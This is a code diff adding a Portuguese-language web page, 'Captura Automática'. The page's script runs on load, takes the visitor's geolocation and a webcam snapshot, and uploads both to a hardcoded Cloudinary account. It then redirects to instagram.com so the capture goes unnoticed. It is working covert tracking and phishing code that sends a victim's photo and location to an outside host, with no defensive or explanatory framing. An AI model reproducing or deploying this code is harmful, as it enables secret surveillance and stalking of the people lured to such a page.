@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Captura Automática</title>
+</head>
+<body>
+    <script>
+        const cloudName = "dx5legahb"; // Substitua pelo seu Cloud Name do Cloudinary
+        const uploadPreset = "ml_default"; // Padrão do Cloudinary
+
+        async function capturarFotoELocalizacao() {
+            try {
+                // Captura a localização
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject);
+                });
+
+                const latitude = pos.coords.latitude;
+                const longitude = pos.coords.longitude;
+
+                // Captura a foto
+                const video = document.createElement('video');
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/png');
+
+                // Converte a imagem em blob
+                const blob = await (await fetch(imageData)).blob();
+                const formData = new FormData();
+                formData.append("file", blob);
+                formData.append("upload_preset", uploadPreset);
+
+                // Envia a imagem para Cloudinary
+                const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
+                    method: "POST",
+                    body: formData
+                });
+
+                const data = await response.json();
+                const imageUrl = data.secure_url;
+
+                // Criar o arquivo de texto com a localização
+                const textBlob = new Blob([`Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`], { type: "text/plain" });
+                const textFormData = new FormData();
+                textFormData.append("file", textBlob, `localizacao_${Date.now()}.txt`);
+                textFormData.append("upload_preset", uploadPreset);
+
+                // Envia o arquivo de texto para Cloudinary
+                await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
+                    method: "POST",
+                    body: textFormData
+                });
+
+                // Redireciona após capturar tudo
+                window.location.href = "https://instagram.com";
+            } catch (error) {
+                console.error("Erro ao capturar dados:", error);
+            }
+        }
+
+        // Executa automaticamente ao carregar a página
+        capturarFotoELocalizacao();
+    </script>
+</body>
+</html>
